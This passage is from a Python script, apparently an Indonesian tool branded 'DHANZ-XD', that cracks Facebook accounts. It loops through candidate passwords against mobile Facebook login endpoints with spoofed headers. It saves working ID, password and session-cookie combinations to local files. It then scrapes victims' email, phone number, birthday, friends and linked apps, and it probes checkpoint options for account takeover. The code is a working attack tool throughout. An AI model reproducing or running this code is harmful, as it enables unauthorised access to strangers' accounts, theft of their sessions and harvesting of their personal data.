	print('\r%s [DHANZ-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title=' NO SESI'))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f"[••] Nama Akun       : {nama}\n[••] Jumlah Teman    : {teman}\n[••] Jumlah Pengikut : {pengikut}\n[••] Email Aktif     : {email}\n[••] Nomor Aktif     : {nomer}\n[••] Tahun Akun      : {tahun}\n[••] Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}>{P}] akun tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'
			else:
				akun += f'\n [{kk}>{P}] terdapat {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}>{P}] kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	
